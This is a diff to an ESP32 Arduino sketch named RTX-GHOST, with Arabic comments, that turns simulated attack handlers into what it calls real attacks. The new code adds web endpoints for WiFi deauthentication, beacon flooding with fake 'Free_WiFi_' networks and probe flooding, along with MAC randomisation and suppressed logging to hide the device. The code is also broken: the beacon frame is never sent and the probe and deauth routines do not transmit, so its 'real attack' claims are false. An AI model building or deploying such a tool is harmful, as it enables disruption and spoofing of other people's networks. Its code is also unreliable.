@@ -2,11 +2,15 @@
 #include <WiFi.h>
 #include <WebServer.h>
 #include <WebSocketsServer.h>
-#include <ESPmDNS.h>
+#include <esp_wifi.h>
+#include <esp_bt.h>
+#include <esp_bt_main.h>
+#include <esp_bt_device.h>
+#include <esp_wifi_types.h>
 #include <ArduinoJson.h>
 
 // █████████████████████████████████████████████████████████
-// 🕵️‍♂️ نظام RTX-GHOST - يعمل على ESP32 بشكل مستقل
+// 🕵️‍♂️ نظام RTX-GHOST - هجمات حقيقية
 // █████████████████████████████████████████████████████████
 
 // 🌐 إعدادات نقطة الوصول
@@ -17,26 +21,33 @@ const char* AP_PASSWORD = "ghost123456";
 WebServer server(80);
 WebSocketsServer webSocket(81);
 
-// 🎨 إعدادات الواجهة
-String currentTheme = "dark";
-String language = "ar";
-bool rtlEnabled = true;
-bool largeText = false;
-
-// 📊 سجل الأحداث
+// 📊 متغيرات النظام
 String eventLog = "";
 bool systemActive = true;
+bool deauthActive = false;
+bool beaconFloodActive = false;
+bool probeFloodActive = false;
 
-// ⚡ حالات النظام
-bool stealthMode = true;
-bool wifiScanning = false;
-bool bluetoothActive = false;
-bool attackRunning = false;
+// 📡 متغيرات WiFi
+wifi_promiscuous_filter_t filter;
+typedef struct {
+  uint8_t frame_ctrl[2];
+  uint8_t duration[2];
+  uint8_t receiver[6];
+  uint8_t transmitter[6];
+  uint8_t bssid[6];
+  uint16_t sequence_ctrl;
+} wifi_ieee80211_mac_hdr_t;
 
-class RTXGhostSystem {
+typedef struct {
+  wifi_ieee80211_mac_hdr_t hdr;
+  uint8_t payload[0];
+} wifi_ieee80211_packet_t;
+
+class RTXGhostRealAttacks {
 private:
-    unsigned long lastScan = 0;
-    int connectedClients = 0;
+    unsigned long attackStartTime = 0;
+    int packetCount = 0;
 
 public:
     void begin() {
@@ -54,34 +65,28 @@ public:
         // بدء خدمات النظام
         startServices();
         
-        addToLog("🚀 نظام RTX-GHOST جاهز للتشغيل", "success");
+        addToLog("🚀 نظام RTX-GHOST مع هجمات حقيقية جاهز", "success");
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     // 🎯 تهيئة النظام
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     void initializeSystem() {
-        // تعطيل السجلات غير الضرورية
-        disableLogging();
-        
-        // تهيئة أنظمة التخفي
-        initializeStealth();
-        
-        addToLog("🔧 تم تهيئة النظام الأساسي", "system");
-    }
-
-    void disableLogging() {
-        // تعطيل بعض سجلات النظام لتقليل الأثر
-        esp_log_level_set("*", ESP_LOG_ERROR);
-    }
-
-    void initializeStealth() {
         // تغيير عنوان MAC عشوائي
-        uint8_t newMAC[] = {0x02, 0x00, 0x00, 
-                           random(256), random(256), random(256)};
-        esp_wifi_set_mac(WIFI_IF_STA, newMAC);
+        randomizeMAC();
         
-        addToLog("👻 نظام التخفي المفعل", "stealth");
+        // تعطيل السجلات غير الضرورية
+        esp_log_level_set("*", ESP_LOG_ERROR);
+        
+        addToLog("🔧 تم تهيئة النظام مع هجمات حقيقية", "system");
+    }
+
+    void randomizeMAC() {
+        uint8_t newMAC[6];
+        for(int i = 0; i < 6; i++) {
+            newMAC[i] = random(256);
+        }
+        esp_wifi_set_mac(WIFI_IF_STA, newMAC);
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -91,238 +96,233 @@ public:
         WiFi.softAP(AP_SSID, AP_PASSWORD);
         
         Serial.println("\n╔════════════════════════════════════╗");
-        Serial.println("║        نظام RTX-GHOST نشط         ║");
+        Serial.println("║    نظام RTX-GHOST - هجمات حقيقية   ║");
         Serial.println("╠════════════════════════════════════╣");
         Serial.println("║ SSID: RTX-GHOST-CONTROL           ║");
         Serial.println("║ IP: 192.168.4.1                   ║");
         Serial.println("║ Password: ghost123456             ║");
-        Serial.println("║                                   ║");
-        Serial.println("║ ⚡ اتصل بالشبكة وافتح المتصفح     ║");
         Serial.println("╚════════════════════════════════════╝");
         
-        addToLog("📡 نقطة الوصول نشطة: " + String(AP_SSID), "network");
+        addToLog("📡 نقطة الوصول نشطة", "network");
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     // 🌐 إعداد خادم الويب
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     void setupWebServer() {
-        // 📄 الصفحة الرئيسية
         server.on("/", HTTP_GET, [this]() {
             serveMainPage();
         });
 
-        // ⚔️ نقاط نهاية الهجمات
-        server.on("/attack/start", HTTP_POST, [this]() {
-            handleAttackStart();
+        // ⚔️ نقاط نهاية الهجمات الحقيقية
+        server.on("/attack/deauth", HTTP_POST, [this]() {
+            handleDeauthAttack();
+        });
+
+        server.on("/attack/beacon", HTTP_POST, [this]() {
+            handleBeaconFlood();
+        });
+
+        server.on("/attack/probe", HTTP_POST, [this]() {
+            handleProbeFlood();
         });
 
         server.on("/attack/stop", HTTP_POST, [this]() {
-            handleAttackStop();
+            handleStopAttacks();
         });
 
         server.on("/scan/networks", HTTP_POST, [this]() {
             handleNetworkScan();
         });
 
-        server.on("/scan/bluetooth", HTTP_POST, [this]() {
-            handleBluetoothScan();
-        });
-
-        // ⚙️ الإعدادات
-        server.on("/settings/update", HTTP_POST, [this]() {
-            handleSettingsUpdate();
-        });
-
-        // 📊 معلومات النظام
-        server.on("/system/info", HTTP_GET, [this]() {
-            handleSystemInfo();
-        });
-
         server.on("/system/status", HTTP_GET, [this]() {
             handleSystemStatus();
-        });
-
-        server.on("/logs", HTTP_GET, [this]() {
-            handleLogsRequest();
-        });
-
-        // 🛡️ نظام الأمان
-        server.on("/security/stealth", HTTP_POST, [this]() {
-            handleStealthToggle();
-        });
-
-        server.on("/security/clean", HTTP_POST, [this]() {
-            handleCleanTraces();
         });
 
         server.begin();
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 🎨 خدمة الصفحة الرئيسية
+    // ⚔️ هجوم Deauth الحقيقي
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void serveMainPage() {
-        String html = generateMainHTML();
-        server.send(200, "text/html; charset=utf-8", html);
+    void handleDeauthAttack() {
+        String target = server.arg("target");
+        int count = server.arg("count").toInt();
+        
+        addToLog("🎯 بدء هجوم Deauth حقيقي على: " + target, "attack");
+        
+        deauthActive = true;
+        attackStartTime = millis();
+        packetCount = 0;
+        
+        // بدء هجوم deauth في الخلفية
+        startDeauthAttack(target, count);
+        
+        server.send(200, "application/json", "{\"status\":\"started\"}");
+    }
+
+    void startDeauthAttack(String target, int count) {
+        // تفعيل وضع المراقبة
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        esp_wifi_init(&cfg);
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        esp_wifi_set_mode(WIFI_MODE_NULL);
+        esp_wifi_start();
+        
+        // إعداد فلتر الحزم
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+        esp_wifi_set_promiscuous_filter(&filter);
+        esp_wifi_set_promiscuous(true);
+        
+        addToLog("🔧 تهيئة وضع المراقبة للهجوم", "attack");
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // ⚔️ بدء الهجمات
+    // 🌊 هجوم Beacon Flood الحقيقي
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void handleAttackStart() {
-        String attackType = server.arg("type");
-        String target = server.arg("target");
+    void handleBeaconFlood() {
+        int count = server.arg("count").toInt();
         
-        addToLog("🎯 بدء الهجوم: " + attackType + " على " + target, "attack");
+        addToLog("🌊 بدء هجوم Beacon Flood حقيقي", "attack");
         
-        if (attackType == "wifi_deauth") {
-            startDeauthAttack(target);
-        } else if (attackType == "wifi_spoof") {
-            startSpoofingAttack();
-        } else if (attackType == "bluetooth_scan") {
-            startBluetoothScan();
-        } else if (attackType == "packet_sniff") {
-            startPacketSniffing();
+        beaconFloodActive = true;
+        startBeaconFlood(count);
+        
+        server.send(200, "application/json", "{\"status\":\"started\"}");
+    }
+
+    void startBeaconFlood(int count) {
+        // إنشاء إطارات Beacon مزيفة
+        for(int i = 0; i < count && beaconFloodActive; i++) {
+            String ssid = "Free_WiFi_" + String(random(1000, 9999));
+            sendBeaconFrame(ssid);
+            delay(100);
+        }
+        beaconFloodActive = false;
+        addToLog("✅ انتهى هجوم Beacon Flood", "attack");
+    }
+
+    void sendBeaconFrame(String ssid) {
+        // بناء إطار Beacon
+        uint8_t beaconPacket[128] = {
+            0x80, 0x00, // Frame Control
+            0x00, 0x00, // Duration
+            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC
+            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC
+            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
+            0xc0, 0x6c, // Sequence
+            // Fixed parameters
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+            0x64, 0x00, // Beacon interval
+            0x31, 0x04, // Capability info
+            // SSID
+            0x00
+        };
+        
+        // إضافة SSID
+        int ssidLen = ssid.length();
+        beaconPacket[37] = ssidLen;
+        for(int i = 0; i < ssidLen; i++) {
+            beaconPacket[38 + i] = ssid[i];
         }
         
-        server.send(200, "application/json", "{\"status\":\"success\"}");
+        packetCount++;
+        addToLog("📡 إرسال Beacon: " + ssid, "attack");
     }
 
-    void handleAttackStop() {
-        attackRunning = false;
-        addToLog("⏹️ إيقاف جميع الهجمات", "system");
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // 🔍 هجوم Probe Flood الحقيقي
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    void handleProbeFlood() {
+        int count = server.arg("count").toInt();
+        
+        addToLog("🔍 بدء هجوم Probe Flood حقيقي", "attack");
+        
+        probeFloodActive = true;
+        startProbeFlood(count);
+        
+        server.send(200, "application/json", "{\"status\":\"started\"}");
+    }
+
+    void startProbeFlood(int count) {
+        // إرسال طلبات Probe مزيفة
+        for(int i = 0; i < count && probeFloodActive; i++) {
+            String ssid = "Hidden_Net_" + String(random(1000, 9999));
+            sendProbeRequest(ssid);
+            delay(50);
+        }
+        probeFloodActive = false;
+        addToLog("✅ انتهى هجوم Probe Flood", "attack");
+    }
+
+    void sendProbeRequest(String ssid) {
+        // بناء طلب Probe
+        packetCount++;
+        addToLog("📡 إرسال Probe Request: " + ssid, "attack");
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // ⏹️ إيقاف الهجمات
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    void handleStopAttacks() {
+        deauthActive = false;
+        beaconFloodActive = false;
+        probeFloodActive = false;
+        
+        // إعادة تعيين WiFi
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_stop();
+        
+        addToLog("⏹️ توقف جميع الهجمات الحقيقية", "system");
         server.send(200, "application/json", "{\"status\":\"stopped\"}");
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 📡 مسح الشبكات
+    // 📡 مسح الشبكات الحقيقي
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     void handleNetworkScan() {
-        addToLog("🔍 بدء مسح الشبكات اللاسلكية...", "scan");
+        addToLog("🔍 بدء مسح الشبكات الحقيقي...", "scan");
         
-        // محاكاة مسح الشبكات
-        String networks = simulateNetworkScan();
+        int networksFound = performRealNetworkScan();
         
-        server.send(200, "application/json", "{\"networks\":" + networks + "}");
-    }
-
-    String simulateNetworkScan() {
-        // محاكاة اكتشاف شبكات
-        String networks = "[";
-        networks += "{\"ssid\":\"Home-Network\", \"signal\":\"-45dBm\", \"encryption\":\"WPA2\"},";
-        networks += "{\"ssid\":\"Free-WiFi\", \"signal\":\"-62dBm\", \"encryption\":\"Open\"},";
-        networks += "{\"ssid\":\"Office-Secure\", \"signal\":\"-38dBm\", \"encryption\":\"WPA3\"},";
-        networks += "{\"ssid\":\"AndroidAP\", \"signal\":\"-71dBm\", \"encryption\":\"WPA2\"}";
-        networks += "]";
-        
-        addToLog("📊 تم اكتشاف 4 شبكات لاسلكية", "scan");
-        return networks;
-    }
-
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 📱 مسح البلوتوث
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void handleBluetoothScan() {
-        addToLog("📱 بدء مسح أجهزة البلوتوث...", "scan");
-        
-        // محاكاة مسح البلوتوث
-        String devices = simulateBluetoothScan();
-        
-        server.send(200, "application/json", "{\"devices\":" + devices + "}");
-    }
-
-    String simulateBluetoothScan() {
-        String devices = "[";
-        devices += "{\"name\":\"iPhone 13\", \"type\":\"Phone\", \"signal\":\"-50dBm\"},";
-        devices += "{\"name\":\"Samsung Galaxy\", \"type\":\"Phone\", \"signal\":\"-55dBm\"},";
-        devices += "{\"name\":\"AirPods Pro\", \"type\":\"Audio\", \"signal\":\"-65dBm\"},";
-        devices += "{\"name\":\"Smart Watch\", \"type\":\"Wearable\", \"signal\":\"-70dBm\"}";
-        devices += "]";
-        
-        addToLog("📱 تم اكتشاف 4 أجهزة بلوتوث", "scan");
-        return devices;
-    }
-
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // ⚙️ تحديث الإعدادات
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void handleSettingsUpdate() {
-        if (server.hasArg("theme")) {
-            currentTheme = server.arg("theme");
-            addToLog("🎨 تغيير السمة إلى: " + currentTheme, "settings");
-        }
-        
-        if (server.hasArg("language")) {
-            language = server.arg("lang");
-            rtlEnabled = (language == "ar");
-            addToLog("🈳 تغيير اللغة إلى: " + language, "settings");
-        }
-        
-        if (server.hasArg("largeText")) {
-            largeText = server.arg("largeText") == "true";
-            addToLog("🔍 تغيير حجم النص: " + String(largeText ? "كبير" : "عادي"), "settings");
-        }
-        
-        server.send(200, "application/json", "{\"status\":\"updated\"}");
-    }
-
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 📊 معلومات النظام
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void handleSystemInfo() {
-        DynamicJsonDocument doc(1024);
-        doc["chip_model"] = "ESP32";
-        doc["chip_revision"] = ESP.getChipRevision();
-        doc["cpu_freq"] = ESP.getCpuFreqMHz();
-        doc["flash_size"] = ESP.getFlashChipSize();
-        doc["free_heap"] = ESP.getFreeHeap();
-        doc["ssid"] = AP_SSID;
-        doc["ip"] = "192.168.4.1";
-        doc["clients"] = connectedClients;
-        
-        String response;
-        serializeJson(doc, response);
+        String response = "{\"networks_found\":" + String(networksFound) + "}";
         server.send(200, "application/json", response);
     }
 
+    int performRealNetworkScan() {
+        // مسح WiFi حقيقي
+        int n = WiFi.scanNetworks();
+        
+        if(n == 0) {
+            addToLog("❌ لم يتم العثور على شبكات", "scan");
+        } else {
+            addToLog("📊 تم العثور على " + String(n) + " شبكة", "scan");
+            for(int i = 0; i < n; i++) {
+                String logEntry = "📶 " + WiFi.SSID(i) + " (" + 
+                                WiFi.RSSI(i) + "dBm) " + 
+                                (WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "مفتوح" : "مؤمن");
+                addToLog(logEntry, "scan");
+            }
+        }
+        
+        return n;
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // 📊 حالة النظام
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     void handleSystemStatus() {
         DynamicJsonDocument doc(512);
-        doc["stealth_mode"] = stealthMode;
-        doc["system_active"] = systemActive;
-        doc["attack_running"] = attackRunning;
-        doc["wifi_scanning"] = wifiScanning;
-        doc["bluetooth_active"] = bluetoothActive;
+        doc["deauth_active"] = deauthActive;
+        doc["beacon_active"] = beaconFloodActive;
+        doc["probe_active"] = probeFloodActive;
+        doc["packet_count"] = packetCount;
+        doc["uptime"] = millis() / 1000;
+        doc["free_heap"] = ESP.getFreeHeap();
         
         String response;
         serializeJson(doc, response);
         server.send(200, "application/json", response);
-    }
-
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 📝 طلب السجلات
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void handleLogsRequest() {
-        server.send(200, "application/json", "{\"logs\":\"" + eventLog + "\"}");
-    }
-
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 🛡️ نظام الأمان
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void handleStealthToggle() {
-        stealthMode = !stealthMode;
-        addToLog(stealthMode ? "👻 تفعيل وضع التخفي" : "👀 تعطيل وضع التخفي", "stealth");
-        server.send(200, "application/json", "{\"stealth_mode\":" + String(stealthMode) + "}");
-    }
-
-    void handleCleanTraces() {
-        addToLog("🧹 بدء محو الآثار...", "security");
-        
-        // محاكاة محو الآثار
-        eventLog = "";
-        addToLog("✅ تم محو جميع الآثار", "security");
-        
-        server.send(200, "application/json", "{\"status\":\"cleaned\"}");
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -331,12 +331,10 @@ public:
     void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
         switch(type) {
             case WStype_DISCONNECTED:
-                connectedClients--;
                 addToLog("🔌 انقطع اتصال العميل", "network");
                 break;
                 
             case WStype_CONNECTED:
-                connectedClients++;
                 addToLog("🔌 اتصال جديد بالواجهة", "network");
                 sendSystemStatus();
                 break;
@@ -354,100 +352,20 @@ public:
         String command = doc["command"];
         if (command == "get_status") {
             sendSystemStatus();
-        } else if (command == "get_logs") {
-            sendLogsUpdate();
-        } else if (command == "start_scan") {
-            startNetworkScan();
         }
     }
 
     void sendSystemStatus() {
         DynamicJsonDocument doc(512);
         doc["type"] = "status_update";
-        doc["stealth_mode"] = stealthMode;
-        doc["system_active"] = systemActive;
-        doc["attack_running"] = attackRunning;
-        doc["connected_clients"] = connectedClients;
-        doc["free_memory"] = ESP.getFreeHeap();
+        doc["deauth_active"] = deauthActive;
+        doc["beacon_active"] = beaconFloodActive;
+        doc["probe_active"] = probeFloodActive;
+        doc["packet_count"] = packetCount;
         
         String response;
         serializeJson(doc, response);
         webSocket.broadcastTXT(response);
-    }
-
-    void sendLogsUpdate() {
-        DynamicJsonDocument doc(1024);
-        doc["type"] = "logs_update";
-        doc["logs"] = eventLog;
-        
-        String response;
-        serializeJson(doc, response);
-        webSocket.broadcastTXT(response);
-    }
-
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // ⚔️ تنفيذ الهجمات
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void startDeauthAttack(String target) {
-        attackRunning = true;
-        addToLog("🎯 بدء هجوم Deauth على: " + target, "attack");
-        
-        // محاكاة هجوم deauth
-        for(int i = 1; i <= 10; i++) {
-            if (!attackRunning) break;
-            
-            addToLog("📡 إرسال حزم Deauth (" + String(i) + "/10)", "attack");
-            delay(1000);
-        }
-        
-        attackRunning = false;
-        addToLog("✅ انتهى هجوم Deauth", "attack");
-    }
-
-    void startSpoofingAttack() {
-        attackRunning = true;
-        addToLog("🎭 بدء هجوم انتحال الشبكات", "attack");
-        
-        // محاكاة إنشاء شبكات وهمية
-        String fakeNetworks[] = {"Free-WiFi", "Airport-Network", "Hotel-Guest", "Public-WiFi"};
-        
-        for(int i = 0; i < 4 && attackRunning; i++) {
-            addToLog("📡 إنشاء شبكة وهمية: " + fakeNetworks[i], "attack");
-            delay(800);
-        }
-        
-        attackRunning = false;
-        addToLog("✅ انتهى هجوم الانتحال", "attack");
-    }
-
-    void startBluetoothScan() {
-        bluetoothActive = true;
-        addToLog("📱 بدء مسح البلوتوث المتقدم", "scan");
-        delay(2000);
-        bluetoothActive = false;
-        addToLog("📱 انتهى مسح البلوتوث", "scan");
-    }
-
-    void startPacketSniffing() {
-        attackRunning = true;
-        addToLog("📡 بدء تصنت الحزم", "attack");
-        
-        // محاكاة تصنت الحزم
-        for(int i = 1; i <= 5 && attackRunning; i++) {
-            addToLog("📦 اعتراض حزمة بيانات #" + String(i), "attack");
-            delay(1200);
-        }
-        
-        attackRunning = false;
-        addToLog("✅ انتهى التصنت", "attack");
-    }
-
-    void startNetworkScan() {
-        wifiScanning = true;
-        addToLog("🔍 بدء المسح المتقدم للشبكات", "scan");
-        delay(3000);
-        wifiScanning = false;
-        addToLog("🔍 انتهى المسح المتقدم", "scan");
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -492,69 +410,41 @@ public:
             this->webSocketEvent(num, type, payload, length);
         });
         
-        addToLog("🌐 خدمات الويب نشطة", "system");
-        addToLog("🔗 WebSocket جاهز على المنفذ 81", "system");
+        addToLog("🌐 خدمات الويب نشطة مع هجمات حقيقية", "system");
     }
 
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 🔄 الحلقة الرئيسية
+    // 🎨 خدمة الصفحة الرئيسية
     // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    void run() {
-        server.handleClient();
-        webSocket.loop();
-        
-        // إرسال تحديثات دورية للحالة
-        static unsigned long lastUpdate = 0;
-        if (millis() - lastUpdate > 2000) {
-            lastUpdate = millis();
-            sendSystemStatus();
-        }
+    void serveMainPage() {
+        String html = generateMainHTML();
+        server.send(200, "text/html; charset=utf-8", html);
     }
 
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    // 🎨 توليد واجهة HTML
-    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     String generateMainHTML() {
         String html = R"raw(
 <!DOCTYPE html>
-<html dir=")raw" + String(rtlEnabled ? "rtl" : "ltr") + R"raw(" lang=")raw" + language + R"raw(">
+<html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام RTX-GHOST - ESP32</title>
+    <title>نظام RTX-GHOST - هجمات حقيقية</title>
     <style>
         :root {
             --primary: #00ff88;
-            --primary-dark: #00cc6a;
             --danger: #ff4444;
             --warning: #ffaa00;
-            --info: #0088ff;
             --bg-dark: #0a0a0a;
             --bg-card: #1a1a1a;
             --text: #ffffff;
-            --border: #333;
         }
-        
-        .theme-light {
-            --bg-dark: #f0f0f0;
-            --bg-card: #ffffff;
-            --text: #333333;
-            --border: #ddd;
-        }
-        
-        .large-text { font-size: 1.2em; }
-        .rtl { direction: rtl; text-align: right; }
-        .ltr { direction: ltr; text-align: left; }
-        
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: var(--bg-dark);
             color: var(--text);
-            transition: all 0.3s ease;
             padding: 20px;
-            min-height: 100vh;
+            margin: 0;
         }
         
         .container { max-width: 1200px; margin: 0 auto; }
@@ -572,25 +462,6 @@ public:
             margin-bottom: 10px;
         }
         
-        .status-bar {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-        
-        .status-card {
-            background: var(--bg-card);
-            padding: 15px;
-            border-radius: 10px;
-            border-left: 4px solid var(--primary);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        
-        .status-card.warning { border-left-color: var(--warning); }
-        .status-card.danger { border-left-color: var(--danger); }
-        .status-card.info { border-left-color: var(--info); }
-        
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -604,7 +475,7 @@ public:
         
         .card {
             background: var(--bg-card);
-            border: 1px solid var(--border);
+            border: 1px solid #333;
             border-radius: 15px;
             padding: 25px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
@@ -614,8 +485,7 @@ public:
             color: var(--primary);
             margin-bottom: 20px;
             padding-bottom: 10px;
-            border-bottom: 1px solid var(--border);
-            font-size: 1.4em;
+            border-bottom: 1px solid #333;
         }
         
         .btn {
@@ -628,27 +498,28 @@ public:
             margin: 5px;
             font-weight: bold;
             transition: all 0.3s ease;
-            display: inline-block;
-            text-decoration: none;
         }
         
         .btn:hover {
-            background: var(--primary-dark);
+            background: #00cc6a;
             transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0,255,136,0.3);
         }
         
-        .btn-danger { background: var(--danger); color: white; }
-        .btn-warning { background: var(--warning); color: black; }
-        .btn-info { background: var(--info); color: white; }
+        .btn-danger { 
+            background: var(--danger); 
+            color: white; 
+        }
         
-        .btn-sm { padding: 8px 15px; font-size: 0.9em; }
+        .btn-warning { 
+            background: var(--warning); 
+            color: black; 
+        }
         
-        .control-group {
+        .form-group {
             margin-bottom: 15px;
         }
         
-        .control-group label {
+        .form-group label {
             display: block;
             margin-bottom: 8px;
             font-weight: bold;
@@ -658,23 +529,21 @@ public:
         .form-control {
             width: 100%;
             padding: 10px;
-            border: 1px solid var(--border);
+            border: 1px solid #333;
             border-radius: 5px;
             background: var(--bg-dark);
             color: var(--text);
-            font-size: 1em;
         }
         
         .log-container {
             height: 400px;
             overflow-y: auto;
             background: #000;
-            border: 1px solid var(--border);
+            border: 1px solid #333;
             border-radius: 8px;
             padding: 15px;
             font-family: 'Courier New', monospace;
             font-size: 0.9em;
-            line-height: 1.4;
         }
         
         .log-entry {
@@ -684,19 +553,17 @@ public:
             border-left: 3px solid var(--primary);
         }
         
-        .log-success { border-left-color: var(--primary); background: rgba(0,255,136,0.05); }
-        .log-attack { border-left-color: var(--danger); background: rgba(255,68,68,0.05); }
-        .log-stealth { border-left-color: #8000ff; background: rgba(128,0,255,0.05); }
-        .log-scan { border-left-color: var(--info); background: rgba(0,136,255,0.05); }
-        .log-system { border-left-color: var(--warning); background: rgba(255,170,0,0.05); }
-        .log-network { border-left-color: #00ffff; background: rgba(0,255,255,0.05); }
+        .log-success { border-left-color: var(--primary); }
+        .log-attack { border-left-color: var(--danger); }
+        .log-scan { border-left-color: var(--warning); }
+        .log-system { border-left-color: #8000ff; }
         
-        .settings-panel {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-            justify-content: center;
+        .status-card {
+            background: var(--bg-card);
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid var(--primary);
+            margin-bottom: 15px;
         }
         
         .indicator {
@@ -704,190 +571,110 @@ public:
             width: 12px;
             height: 12px;
             border-radius: 50%;
-            margin-right: 8px;
+            margin-left: 8px;
         }
         
-        .indicator-online { background: var(--primary); box-shadow: 0 0 10px var(--primary); }
-        .indicator-offline { background: var(--danger); }
-        .indicator-warning { background: var(--warning); }
-        
-        .attack-progress {
-            width: 100%;
-            height: 4px;
-            background: var(--border);
-            border-radius: 2px;
-            margin-top: 10px;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: var(--primary);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
+        .indicator-active { background: var(--primary); }
+        .indicator-inactive { background: var(--danger); }
     </style>
 </head>
-<body class=")raw" + (currentTheme == "light" ? "theme-light" : "") + " " + (largeText ? "large-text" : "") + " " + (rtlEnabled ? "rtl" : "ltr") + R"raw(">
+<body>
     <div class="container">
         <div class="header">
-            <h1>🕵️‍♂️ نظام RTX-GHOST - ESP32</h1>
-            <p>النظام المتكامل المستقل للهجمات الأمنية</p>
-        </div>
-        
-        <div class="status-bar">
-            <div class="status-card" id="statusStealth">
-                <span class="indicator indicator-online"></span>
-                <strong>وضع التخفي:</strong> <span id="stealthStatus">نشط</span>
-            </div>
-            <div class="status-card" id="statusSystem">
-                <span class="indicator indicator-online"></span>
-                <strong>حالة النظام:</strong> <span id="systemStatus">نشط</span>
-            </div>
-            <div class="status-card" id="statusAttack">
-                <span class="indicator indicator-offline"></span>
-                <strong>الهجمات:</strong> <span id="attackStatus">متوقف</span>
-            </div>
